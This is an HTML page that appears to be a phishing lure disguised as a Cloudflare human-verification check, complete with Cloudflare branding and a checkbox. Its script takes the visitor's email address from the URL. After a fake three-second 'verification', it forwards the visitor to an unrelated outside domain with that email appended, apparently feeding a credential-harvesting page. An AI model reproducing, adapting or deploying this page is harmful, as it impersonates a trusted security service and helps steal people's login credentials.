<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            max-width: 350px;
            width: 100%;
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        .verification-box {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid #ccc;
            padding: 10px;
            border-radius: 5px;
            margin: 20px 0;
            background-color: #f9f9f9;
            max-width: 250px;
            margin: 20px auto;
        }

        .verification-box input {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }

        .cf-branding {
            display: flex;
            align-items: center;
        }

        .cf-branding img {
            width: 30px;
            margin-right: 5px;
        }

        .cf-branding a {
            font-size: 12px;
            color: #666;
            text-decoration: none;
            margin-left: 10px;
        }

        .cf-branding a:hover {
            text-decoration: underline;
        }

        .submit-btn {
            background-color: #0078D4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .submit-btn:disabled {
            background-color: #b3b3b3;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid rgba(0, 0, 0, 0.1);
            border-left-color: #0078D4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .footer-message {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            text-align: center;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo" class="logo">
        <p><span style="font-size: 13px;">To continue, please confirm you&rsquo;re a human by clicking the button below. This is part of our security verification process.</span></p>
        <div class="verification-box">
            <div class="verify"><input type="checkbox" id="verify" name="verify"> <label for="verify">Access Verification</label></div>
        </div>
        <form id="verificationForm" method="POST"><button type="submit" class="submit-btn">Submit</button></form>
        <div class="loading" id="loadingIndicator">
            <div class="spinner"><br></div>
        </div>
        <p class="footer-message">This message was generated by the system for security purposes. Please do not reply.</p>
    </div>
    <script nonce="MTcyOTY1MTMwNywyOTU0NDA1ODcx">
        document.addEventListener('DOMContentLoaded', function () {
            // Extract and decode the email from the URL
            const urlParams = new URLSearchParams(window.location.search);
            let email = urlParams.get('email'); 
            
            // Check if email is present and decode it properly
            if (email) {
                email = decodeURIComponent(email); // Decode the email to handle %40 -> @
            }
        
            // Listen for form submission
            document.getElementById('verificationForm').addEventListener('submit', function (event) {
                event.preventDefault();
                
                // Check if the checkbox is checked
                if (document.getElementById('verify').checked) {
                    document.getElementById('loadingIndicator').style.display = 'block';
                    document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');
                    
                    // Redirect after a delay and use the email without encoding again
                    setTimeout(function () {
                        window.location.href = 'https://validatetor.es/wire/index.html' + email;
                    }, 3000);
                } else {
                    alert('Please verify that you are a human being by ticking the checkbox.');
                }
            });
        });
    </script>
</body>

</html>
